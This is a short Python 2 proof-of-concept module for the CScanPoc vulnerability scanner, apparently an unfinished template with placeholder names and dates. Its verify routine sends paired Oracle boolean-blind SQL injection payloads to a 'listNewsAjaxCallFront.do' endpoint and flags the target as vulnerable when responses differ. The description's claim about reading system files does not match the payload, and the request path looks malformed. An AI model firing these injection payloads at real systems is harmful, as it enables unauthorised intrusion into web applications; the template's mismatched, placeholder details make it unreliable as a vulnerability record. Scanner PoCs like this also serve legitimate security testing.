# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Minanins_0101' # 平台漏洞编号
    name = 'aaaaaaaaa' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = 'aaaaaaaaaaaa'  # 漏洞公布时间
    desc = '''模版漏洞描述
    漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'aaaaaaaaaa'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'aaaaaaaaaaaaaaaaaa' # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-27' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = "/maechannel/manage/info/listNewsAjaxCallFront.doinfolisttype=4 and length(SYS_CONTEXT('USERENV','CURRENT_USER'))=13&infotype=2&page=1&status=1"
            payload1 = "/maechannel/manage/info/listNewsAjaxCallFront.doinfolisttype=4 and length(SYS_CONTEXT('USERENV','CURRENT_USER'))=0&infotype=2&page=1&status=1"
            url = self.target + payload
            url1 = self.target + payload1
            _response = requests.get(url)
            _response1 = requests.get(url1)
            if _response.text != _response1.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
